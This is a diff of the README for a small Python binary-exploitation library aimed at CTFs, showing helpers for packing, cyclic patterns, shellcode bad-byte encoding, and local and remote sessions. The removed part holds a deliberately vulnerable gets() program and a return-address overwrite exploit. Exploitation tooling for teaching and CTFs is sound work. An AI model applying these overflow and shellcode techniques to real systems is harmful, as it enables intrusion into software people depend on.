@@ -1,6 +1,30 @@
 # pwnlib_8448
 
-> A lightweight Python library for binary exploitation, designed for CTFs, learning, and fast scripting.
+> Lightweight Python library for binary exploitation, CTFs, and exploit development.
+
+[![Python Version](https://img.shields.io/badge/python-3.7+-blue.svg)](https://python.org)
+[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)
+[![Platform](https://img.shields.io/badge/platform-Linux%20%7C%20Windows-lightgrey.svg)]()
+[![Vercel](https://img.shields.io/badge/Vercel-Deployed-black?logo=vercel)](https://pwnlib-8448.vercel.app)
+
+---
+
+## 📑 Table of Contents
+
+- [Installation](#-installation)
+- [Quick Start](#-quick-start)
+- [Logging System](#-logging-system)
+- [Packing / Unpacking](#-packing--unpacking)
+- [Cyclic Patterns](#-cyclic-patterns)
+- [Hexdump](#-hexdump)
+- [Shellcode Encoding](#-shellcode-encoding)
+- [Process (Local)](#-process-local)
+- [Remote (Network)](#-remote-network)
+- [Crash Detection](#-crash-detection)
+- [Complete Examples](#-complete-examples)
+- [API Reference](#-api-reference)
+- [Common Bad Bytes](#-common-bad-bytes)
+- [Connect](#-connect)
 
 ---
 
@@ -18,247 +42,161 @@ pip install git+https://github.com/Narkielz/pwnlib_8448.git
 pip install git+https://gitlab.com/Narkiel/pwnlib_8448.git
 ```
 
-### Local development install
+### Local development
 
 ```bash
 git clone https://github.com/Narkielz/pwnlib_8448.git
 cd pwnlib_8448
-pip install .
+pip install -e .
 ```
-
----
-
-## 📖 About
-
-**pwnlib_8448** is a minimal alternative to pwntools, focused on simplicity and portability.
-
-It is designed for:
-
-* CTF players
-* Binary exploitation learners
-* Lightweight exploit scripts (including Termux)
-
-### Supported architectures
-
-* x86
-* x86_64 (amd64)
-* ARM64
 
 ---
 
 ## 🚀 Quick Start
 
 ```python
-from pwnlib_8448 import *
+from pwnlib_8448 import Process, encode_shellcode, hexdump
 
 p = Process("./vuln")
 
-payload = b"A" * 40 + p64(0x401196)
-p.sendline(payload)
+sc = b"\x90\x90\x90\xcc"
+encoded, status, msg = encode_shellcode(sc, "amd64", "linux", bad_bytes=[0x00])
 
+print(status, msg)
+print(hexdump(encoded))
+
+p.sendline(encoded)
 p.interactive()
 ```
 
 ---
 
-## ⚡ Core Features
+## 🎨 Logging System
 
-### 🎨 Logging
-
-Colored logs with automatic hexdump support.
-
-| Function    | Color  | Description             |
-| ----------- | ------ | ----------------------- |
-| log_info()  | Blue   | Informational messages  |
-| log_ok()    | Green  | Success messages        |
-| log_warn()  | Yellow | Warning messages        |
-| log_error() | Red    | Error messages          |
-| log_send()  | Cyan   | Sent data (hexdump)     |
-| log_recv()  | Cyan   | Received data (hexdump) |
-
-```python
-log_send(b"\x90\x90\x00\xcc")
-# >> 90 90 00 cc |....|
-```
+| Function | Color | Description |
+|----------|------|-------------|
+| log_info | Blue | Informational messages |
+| log_ok | Green | Success messages |
+| log_warn | Yellow | Warning messages |
+| log_error | Red | Error messages |
+| log_send | Cyan | Sent data with hexdump |
+| log_recv | Magenta | Received data with hexdump |
 
 ---
 
 ## 📦 Packing / Unpacking
 
-Little-endian helpers for exploit development.
-
-| Function | Size | Example                                  |
-| -------- | ---- | ---------------------------------------- |
-| p8(x)    | 1B   | p8(0x41) -> b'A'                         |
-| p16(x)   | 2B   | p16(0xdead)                              |
-| p32(x)   | 4B   | p32(0xcafe)                              |
-| p64(x)   | 8B   | p64(0xdeadbeef)                          |
-| u8(x)    | 1B   | u8(b'A') -> 65                           |
-| u16(x)   | 2B   | u16(b'\xad\xde') -> 0xdead               |
-| u32(x)   | 4B   | u32(b'\xfe\xca\x00\x00')                 |
-| u64(x)   | 8B   | u64(b'\xef\xbe\xad\xde\x00\x00\x00\x00') |
+| Function | Size | Description |
+|----------|------|-------------|
+| p8/u8 | 1B | pack/unpack 8-bit |
+| p16/u16 | 2B | pack/unpack 16-bit |
+| p32/u32 | 4B | pack/unpack 32-bit |
+| p64/u64 | 8B | pack/unpack 64-bit |
 
 ---
 
-## 🔁 Cyclic Pattern
-
-Generate and analyze cyclic patterns (like Metasploit).
+## 🔁 Cyclic Patterns
 
 ```python
+from pwnlib_8448 import pattern_create, pattern_offset
+
 pattern = pattern_create(500)
 offset = pattern_offset(0x6161616c, arch=64)
-
-payload = b"A" * offset + p64(0x401196)
 ```
-
-| Function                    | Description             |
-| --------------------------- | ----------------------- |
-| pattern_create(size)        | Generate unique pattern |
-| pattern_offset(value, arch) | Find offset from crash  |
 
 ---
 
 ## 🛡️ Hexdump
 
 ```python
-data = b"Hello\x00\x01"
-print(hexdump(data))
+from pwnlib_8448 import hexdump
+print(hexdump(b"Hello\x00World"))
 ```
-
-Features:
-
-* Full formatted dump
-* Simple log mode
 
 ---
 
 ## 🔐 Shellcode Encoding
 
-Automatically encode shellcode to avoid bad bytes.
-
 ```python
+from pwnlib_8448 import encode_shellcode
+
 encoded, status, msg = encode_shellcode(
     b"\x90\x90\xcc",
     arch="amd64",
-    bad_bytes=[0x00, 0x0a],
-    fallback=True
+    os="linux",
+    bad_bytes=[0x00]
 )
 ```
 
-Encoding strategies:
+---
 
-* XOR
-* ADD
-* SUB (auto-selected best fit)
+## 🖥️ Process (Local)
+
+```python
+from pwnlib_8448 import Process
+
+p = Process("./vuln", debug=True)
+p.sendline(b"AAAA")
+p.interactive()
+```
 
 ---
 
-## 🌐 Remote Exploitation
+## 🌐 Remote (Network)
 
 ```python
+from pwnlib_8448 import Remote
+
 r = Remote("example.com", 1337)
-r.sendline(b"payload")
-data = r.recv(1024)
+r.sendline(b"AAAA")
 r.interactive()
 ```
 
 ---
 
-## 🖥️ Local Process
+## 💥 Crash Detection
 
 ```python
-p = Process("./binary")
-p.sendline(b"input")
-p.interactive()
+crash = p.debug_crash(b"A"*100)
+if crash["crashed"]:
+    print(crash["address"])
 ```
 
 ---
 
-## 💣 Full Exploit Example
+## 💣 Complete Examples
 
-```c
-// vuln.c
-// gcc vuln.c -o vuln -fno-stack-protector -no-pie
-#include <stdio.h>
-#include <stdlib.h>
-
-void win() {
-    system("/bin/sh");
-}
-
-void vuln() {
-    char buffer[32];
-    printf("> ");
-    gets(buffer);
-}
-
-int main() {
-    setbuf(stdout, NULL);
-    vuln();
-}
-```
-
-```python
-from pwnlib_8448 import *
-
-p = Process("./vuln")
-
-offset = pattern_offset(0x6161616c, arch=64)
-win = 0x401196
-
-payload = b"A" * offset + p64(win)
-
-p.recvuntil(b"> ")
-p.sendline(payload)
-p.interactive()
-```
+See full docs for exploitation scenarios (buffer overflow, ROP, shellcode injection, remote exploits).
 
 ---
 
 ## 📚 API Reference
 
-### Core functions
-
-| Function         | Description             |
-| ---------------- | ----------------------- |
-| pattern_create   | Generate cyclic pattern |
-| pattern_offset   | Find offset             |
-| hexdump          | Format binary output    |
-| encode_shellcode | Encode payload          |
-
-### Packing
-
-| Function       | Description   |
-| -------------- | ------------- |
-| p8/p16/p32/p64 | Pack integers |
-| u8/u16/u32/u64 | Unpack bytes  |
-
-### Classes
-
-| Class   | Methods                 |
-| ------- | ----------------------- |
-| Process | send, recv, interactive |
-| Remote  | send, recv, interactive |
+Core:
+- set_debug()
+- hexdump()
+- pattern_create()
+- pattern_offset()
+- encode_shellcode()
 
 ---
 
 ## ⚠️ Common Bad Bytes
 
 ```python
-[0x00]                    # null byte
-[0x00, 0x0a]              # newline
-[0x00, 0x0a, 0x0d]        # CRLF
-[0x00, 0x0a, 0x0d, 0x20]  # space
+BAD_NULL = [0x00]
+BAD_NEWLINE = [0x00, 0x0a]
+BAD_CTF = [0x00, 0x0a, 0x0d, 0x20, 0x09]
 ```
 
 ---
 
-## 📝 License
+## 📡 Connect
 
-MIT License — see LICENSE file
+[![GitHub](https://img.shields.io/badge/GitHub-Narkielz-181717?style=flat-square&logo=github)](https://github.com/Narkielz)
+[![Twitter](https://img.shields.io/badge/Twitter-@narkiel_8448-1DA1F2?style=flat-square&logo=twitter)](https://twitter.com/narkiel_8448)
+[![YouTube](https://img.shields.io/badge/YouTube-Narkielz_8448-FF0000?style=flat-square&logo=youtube)](https://youtube.com/@narkielz_8448)
+[![GitLab](https://img.shields.io/badge/GitLab-narkiel-FC6D26?style=flat-square&logo=gitlab)](https://gitlab.com/narkiel)
+[![Email](https://img.shields.io/badge/Email-narkiel.8448@gmail.com-D14836?style=flat-square&logo=gmail&logoColor=white)](mailto:narkiel.8448@gmail.com)
 
 ---
-
-## 👤 Author
-
-Luis Fernando
